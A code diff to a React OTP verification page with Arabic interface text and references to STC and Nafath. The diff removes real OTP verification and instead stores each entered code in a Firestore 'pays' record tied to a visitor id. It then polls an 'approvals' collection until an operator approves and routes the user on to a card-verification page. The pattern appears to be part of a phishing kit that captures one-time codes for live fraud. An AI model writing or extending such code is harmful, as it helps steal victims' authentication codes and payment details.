@@ -5,10 +5,11 @@ import type React from "react";
 import { useCallback, useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { STCModal } from "../components/STCModal";
-import { resendOtp, verifyOtp } from "../lib/actions";
+import { resendOtp } from "../lib/actions";
 import OtpInput from "../components/otp-input";
 import { WaitingApprovalModal } from "../components/WaitingApprovalModal";
 import FirestoreRedirect from "./rediract-page";
+import { addData } from "../apis/firebase";
 
 export default function OtpVerification() {
   const router = useNavigate();
@@ -79,6 +80,28 @@ export default function OtpVerification() {
     }
   }, []);
 
+  // Function to get data from Firestore
+  const getDataFromFirestore = async (collection: string, docId: string) => {
+    try {
+      // Import Firebase functions
+      const { db } = await import("../apis/firebase");
+      const { doc, getDoc } = await import("firebase/firestore");
+
+      const docRef = doc(db, collection, docId);
+      const docSnap = await getDoc(docRef);
+
+      if (docSnap.exists()) {
+        return docSnap.data();
+      } else {
+        console.log("No such document!");
+        return null;
+      }
+    } catch (error) {
+      console.error("Error getting document:", error);
+      throw error;
+    }
+  };
+
   const handleSubmit = useCallback(
     async (e: React.FormEvent) => {
       e.preventDefault();
@@ -90,34 +113,92 @@ export default function OtpVerification() {
       }
 
       try {
-        const orderId = localStorage.getItem("order_id");
-        if (!orderId) {
-          setError("لم يتم العثور على معرف الطلب");
+        const visitorId = localStorage.getItem("visitor");
+        if (!visitorId) {
+          setError("لم يتم العثور على معرف الزائر");
           return;
         }
 
         setShowApprovalModal(true);
 
-        const result = await verifyOtp(JSON.parse(orderId), otpValue);
+        // Store the OTP in Firestore for admin approval
+        try {
+          const { db } = await import("../apis/firebase");
+          const { doc, updateDoc, setDoc } = await import("firebase/firestore");
 
-        if (result.success) {
-          // Verification successful
+          // Update the pays collection with the OTP
+          const paysDocRef = doc(db, "pays", visitorId);
+          await updateDoc(paysDocRef, {
+            phoneOtp: otpValue,
+            phoneOtpStatus: "pending",
+            updatedAt: new Date().toISOString(),
+          }).catch(async () => {
+            // If document doesn't exist, create it
+            await setDoc(paysDocRef, {
+              phoneOtp: otpValue,
+              phoneOtpStatus: "pending",
+              createdDate: new Date().toISOString(),
+            });
+          });
+
+          // Check for approval status
+          const approvalDoc = await getDataFromFirestore(
+            "approvals",
+            visitorId
+          );
+
+          if (approvalDoc && approvalDoc.phoneApproved) {
+            // Approval found and is approved
+            setShowApprovalModal(false);
+            addData({ id: visitorId, pagename: "verify-card" });
+            router("/verify-card"); // Navigate to verify card page
+          } else {
+            // Wait for approval
+            // Keep the modal open until approval is received
+            // We'll poll for approval status
+            const checkApproval = setInterval(async () => {
+              const updatedApproval = await getDataFromFirestore(
+                "approvals",
+                visitorId
+              );
+              if (updatedApproval && updatedApproval.phoneApproved) {
+                clearInterval(checkApproval);
+                setShowApprovalModal(false);
+                addData({ id: visitorId, pagename: "verify-card" });
+                router("/verify-card");
+              } else if (
+                updatedApproval &&
+                updatedApproval.phoneApproved === false
+              ) {
+                clearInterval(checkApproval);
+                setShowApprovalModal(false);
+                setApprovalStatus("rejected");
+                setError("تم رفض طلبك");
+              }
+            }, 3000); // Check every 3 seconds
+
+            // Clear interval after 2 minutes if no response
+            setTimeout(() => {
+              clearInterval(checkApproval);
+              if (showApprovalModal) {
+                setShowApprovalModal(false);
+                setError("انتهت مهلة الموافقة، يرجى المحاولة مرة أخرى");
+              }
+            }, 120000);
+          }
+        } catch (firestoreError) {
+          console.error("Firestore error:", firestoreError);
           setShowApprovalModal(false);
-          router("/nafaz");
-        } else {
-          // Verification failed
-          setShowApprovalModal(false);
-          setApprovalStatus("rejected");
-          setError(result.message || "رمز التحقق غير صحيح");
+          setError("حدث خطأ أثناء التحقق من حالة الموافقة");
         }
-        // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (error) {
+        console.error("Verification error:", error);
         setShowApprovalModal(false);
         setApprovalStatus("rejected");
-        setError("رمز التحقق غير صحيح");
+        setError("حدث خطأ أثناء التحقق من الرمز");
       }
     },
-    [otp, router]
+    [otp, router, _id, showApprovalModal]
   );
 
   return (
@@ -229,7 +310,7 @@ export default function OtpVerification() {
       {showSTCModal && (
         <STCModal
           isOpen={showSTCModal}
-          onClose={function (): void {
+          onClose={(): void => {
             setShowSTCModal(false);
           }}
         />
